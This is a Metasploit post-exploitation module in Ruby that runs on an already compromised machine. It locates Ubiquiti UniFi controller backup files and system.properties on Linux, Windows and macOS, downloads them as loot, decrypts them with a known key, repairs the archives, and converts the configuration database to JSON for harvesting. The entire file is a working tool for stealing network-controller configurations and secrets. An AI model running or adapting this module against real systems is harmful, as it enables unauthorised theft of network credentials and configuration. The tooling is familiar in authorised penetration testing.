##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Auxiliary::Ubiquiti

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Multi Gather Ubiquiti UniFi Controller Backup',
      'Description'   => %q{
        On an Ubiquiti UniFi controller, reads the system.properties configuration file
        and downloads the backup and autobackup files.  The files are then decrypted using
        a known encryption key, then attempted to be repaired by zip.  Meterpreter must be
        used due to the large file sizes, which can be flaky on regular shells to read.
        Confirmed to work on 5.10.19 - 5.10.23, but most likely quite a bit more.
        If the zip can be repaired, the db and its information will be extracted.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'h00die', #metasploit module
          'zhangyoufu', # git scripts
          'justingist' # git script
        ],
      'Platform' => [ 'linux', 'win', 'osx' ],
      'SessionTypes' => %w[meterpreter],
      'References' =>
        [
          ['URL', 'https://github.com/zhangyoufu/unifi-backup-decrypt/'],
          ['URL', 'https://github.com/justingist/POSH-Ubiquiti/blob/master/Posh-UBNT.psm1'],
          ['URL', 'https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation'],
          ['URL', 'https://community.ubnt.com/t5/UniFi-Wireless/unf-controller-backup-file-format/td-p/1624105']
        ]
    ))

      register_options([
        OptPath.new('SYSTEMFILE', [false, 'Custom system.properties file location']),
        OptPath.new('BACKUPFOLDER', [false, 'Custom backup folder']),
      ])
  end

  def find_save_files(d)
    case session.platform
    when 'windows'
      files = session.fs.dir.foreach(d)
    else
    #when 'linux', 'osx', 'unifi'
      # osx will have a space in it by default, so we wrap the directory in quotes
      files = cmd_exec("ls '#{d}'").split(/\r\n|\r|\n/)
    end
    files.each do |file|
      full = "#{d}/#{file}"
      if directory?(full) && !['.', '..'].include?(file)
        find_save_files(full)
        next
      end

      unless file.end_with? ".unf"
        next
      end

      f = read_file(full)
      if f.nil?
        print_error("#{full} read at 0 bytes.  Either file is empty or error reading.  If this is a shell, you need to upgrade to meterpreter!!!")
        next
      end
      loot_path = store_loot('ubiquiti.unifi.backup', 'application/zip', session,
                             f, file, 'Ubiquiti Unifi Controller Encrypted Backup Zip')
      print_good("File #{full} saved to #{loot_path}")
      decrypted_data = decrypt_unf(f)
      if decrypted_data.nil? || decrypted_data.empty?
        print_error("Unable to decrypt #{loot_path}")
        next
      end
      loot_path = store_loot('ubiquiti.unifi.backup_decrypted', 'application/zip', session,
                             decrypted_data, "#{file}.broken.zip", 'Ubiquiti Unifi Controller Decrypted Broken Backup Zip')
      print_good("File #{file} DECRYPTED and saved to #{loot_path}.  File needs to be repair via `zip -FF`")
      # ruby zip can't repair, we can try on command line but its not likely to succeed on all platforms
      # tested on kali
      repaired = repair_zip(loot_path)
      if repaired.nil?
        fail_with Failure::Unknown, "Repair failed on #{loot_path.path}"
      end
      loot_path = store_loot('ubiquiti.unifi.backup_decrypted_repaired', 'application/zip', session,
                             repaired, "#{file}.zip", 'Ubiquiti Unifi Controller Backup Zip')
      print_good("File #{full} DECRYPTED and REPAIRED and saved to #{loot_path}.")
      config_db = extract_and_process_db(loot_path)
      if config_db.nil?
        fail_with Failure::Unknown, 'Unable to locate db.gz config database file'
      end
      print_status('Converting BSON to JSON.')
      unifi_config_db_json = bson_to_json(config_db)

      if unifi_config_db_json == {}
        fail_with Failure::Unknown, 'Error in file conversion from BSON to JSON.'
      end
      unifi_config_eater(session.session_host, session.session_port, unifi_config_db_json)
    end
  end

  def run
    backup_locations = []
    sprop_locations = []

    vprint_status("OS Detected: %s" %(session.platform))

    case session.platform
    when 'windows'
      grab_user_profiles().each do |user|
        backup_locations << "#{user['ProfileDir']}\\Ubiquiti Unifi\\data\\backup"
        sprop_locations << "#{user['ProfileDir']}\\Ubiquiti UniFi\\data\\system.properties"
      end
    when 'osx'
      # https://github.com/rapid7/metasploit-framework/pull/11548#issuecomment-472568795
      get_users.each do |user|
        backup_locations << "/Users/#{user['name']}/Library/Application Support/UniFi/data/backup"
        sprop_locations  << "/Users/#{user['name']}/Library/Application Support/Unifi/data/system.properties"
      end
    else #linux, or a similar device from ubiquiti
      # https://help.ubnt.com/hc/en-us/articles/226218448-UniFi-How-to-Configure-Auto-Backup
      backup_locations = [
        '/data/autobackup', #Cloud key
        '/var/lib/unifi/backup', #software install linux
        '/mnt/data/unifi/data/backup' #UDM-PRO (possibly UDM as well)
      ]

      sprop_locations = [
        '/var/lib/unifi/system.properties', #default location on 5.10.19 on ubuntu 18.04
        '/mnt/data/unifi/data/system.properties' #UDM-Pro (possibly UDM as well)
      ]
    end

    # read system.properties
    if datastore['SYSTEMFILE']
      sprop = datastore['SYSTEMFILE']
      vprint_status("Utilizing custom system.properties file location: #{datastore['SYSTEMFILE']}")
    end

    print_status("Attempting to read system.properties file to determine backup locations.")
    # https://help.ubnt.com/hc/en-us/articles/205202580-UniFi-system-properties-File-Explanation
    sprop_locations.each do |sprop|
      next unless exists?(sprop)
      begin
        data = read_file(sprop)
        loot_path = store_loot('ubiquiti.system.properties', 'text/plain', session, data, sprop)
        vprint_status("File #{sprop} saved to #{loot_path}")
        print_good("Read UniFi Controller file #{sprop}")
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error("Failed to read #{sprop}")
        data = ''
      end
      data.each_line do |line|
        unless line.chomp.empty? || line =~ /^#/
          if /^autobackup\.dir\s*=\s*(?<d>.+)$/ =~ line
            backup_locations.append(d.strip)
            vprint_status("Custom autobackup directory identified: #{d.strip}")
          end
        end
      end
    end

    print_status("Attempting to locate and read backup files.")
    backup_locations.each do |bl|
      if not directory?(bl)
        vprint_error("Directory doesn't exist: #{bl}")
        next
      end

      vprint_good("Found backup folder: #{bl}")
      find_save_files(bl)
    end
  end
end
